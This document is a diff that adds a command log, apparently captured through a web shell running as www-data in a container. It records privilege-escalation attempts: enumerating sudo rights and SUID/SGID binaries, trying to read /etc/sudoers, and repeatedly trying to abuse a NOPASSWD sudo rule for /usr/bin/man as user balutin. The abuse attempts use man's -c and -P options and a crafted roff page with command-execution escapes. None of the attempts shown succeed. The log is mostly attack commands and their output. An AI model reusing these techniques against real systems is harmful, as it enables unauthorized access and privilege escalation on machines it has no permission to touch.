@@ -1,0 +1,111 @@
+######## CMD: id; id -u; whoami; hostname; pwd
+<pre></pre><pre>www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+33
+www-data
+0f38876b0aa7
+/var/www/html
+</pre>
+   [http requests used: 2]
+######## CMD: sudo -n -l 2>&1; echo "---SUID---"; find / -xdev -perm -4000 -readable 2>/dev/null; echo "---SGID---"; find / -xdev -perm -2000 -readable 2>/dev/null | head -20
+<pre></pre><pre>www-data
+Matching Defaults entries for www-data on 0f38876b0aa7:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User www-data may run the following commands on 0f38876b0aa7:
+    (balutin) NOPASSWD: /usr/bin/man
+---SUID---
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/su
+/usr/bin/sudo
+---SGID---
+/usr/bin/chage
+/usr/bin/expiry
+/usr/sbin/unix_chkpwd
+/var/mail
+/var/local
+</pre>
+   [http requests used: 2]
+######## CMD: sudo -u balutin /usr/bin/man -c "id" 2>&1 | tail -5
+<pre></pre><pre>www-data
+
+gzip: stdout: Broken pipe
+/usr/bin/man: command exited with status 1: (cd /usr/share/man && /usr/libexec/man-db/zsoelim) | (cd /usr/share/man && /usr/libexec/man-db/manconv -f UTF-8:ISO-8859-1 -t UTF-8//IGNORE) | (cd /usr/share/man && preconv -e UTF-8) | (cd /usr/share/man && tbl) | (cd /usr/share/man && nroff -mandoc -Tascii) | iconv -c -f ANSI_X3.4-1968 -t UTF-8//TRANSLIT | gzip -c7
+/usr/bin/man: can't unlink (null): Bad address
+</pre>
+   [http requests used: 2]
+######## CMD: sudo -u balutin /usr/bin/man -P "id" ls 2>&1 | head -8
+<pre></pre><pre>www-data
+LS(1)                            User Commands                           LS(1)
+
+NAME
+       ls - list directory contents
+
+SYNOPSIS
+       ls [OPTION]... [FILE]...
+
+</pre>
+   [http requests used: 2]
+######## CMD: sudo -u balutin env 2>&1 | grep -iE "^(MANPAGER|PAGER|DISPLAY)=" ; echo "MANPAGER_rc=$?"; sudo -u balutin sh -c "echo BALUTIN_EXEC_OK; id" 2>&1
+<pre></pre><pre>www-data
+MANPAGER_rc=1
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+sudo: a password is required
+</pre>
+   [http requests used: 2]
+######## CMD: printf "%s\n" ".TH EVIL 1" ".SH NAME" "evil" ".nf" "'e id" "\"\"e id" > /tmp/evil.1; cat /tmp/evil.1; echo "---RUN---"; sudo -u balutin /usr/bin/man -l /tmp/evil.1 2>&1 | head -20
+<pre></pre><pre>www-data
+.TH EVIL 1
+.SH NAME
+evil
+.nf
+'e id
+""e id
+---RUN---
+EVIL(1)                     General Commands Manual                    EVIL(1)
+
+NAME
+       evil
+       ""e id
+
+                                                                       EVIL(1)
+</pre>
+   [http requests used: 2]
+######## CMD: echo "=== FULL ENV sudo passes to balutin ==="; sudo -u balutin env | sort; echo "=== readable sudoers ==="; cat /etc/sudoers 2>&1 | grep -v "^[[:space:]]*#" | grep -v "^$"; ls -la /etc/sudoers.d/ 2>&1; cat /etc/sudoers.d/* 2>&1
+<pre></pre><pre>www-data
+=== FULL ENV sudo passes to balutin ===
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+sudo: a password is required
+=== readable sudoers ===
+cat: /etc/sudoers: Permission denied
+total 12
+drwxr-xr-x 2 root root 4096 Apr  5  2025 .
+drwxr-xr-x 1 root root 4096 Oct  1 16:23 ..
+-r--r----- 1 root root 1096 Jun 27  2023 README
+cat: /etc/sudoers.d/README: Permission denied
+</pre>
+   [http requests used: 2]
+######## CMD: echo "--- is /usr/bin/man allowed? ---"; sudo -u balutin /usr/bin/man --version > /tmp/o1 2>&1; echo "man_rc=$?"; cat /tmp/o1; echo "--- is arbitrary /usr/bin/id allowed? ---"; sudo -u balutin /usr/bin/id > /tmp/o2 2>&1; echo "id_rc=$?"; cat /tmp/o2; echo "--- is /usr/bin/env allowed? ---"; sudo -u balutin /usr/bin/env > /tmp/o3 2>&1; echo "env_rc=$?"; cat /tmp/o3
+<pre></pre><pre>www-data
+--- is /usr/bin/man allowed? ---
+man_rc=0
+man 2.11.2
+--- is arbitrary /usr/bin/id allowed? ---
+id_rc=1
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+sudo: a password is required
+--- is /usr/bin/env allowed? ---
+env_rc=1
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+sudo: a password is required
+</pre>
+   [http requests used: 2]
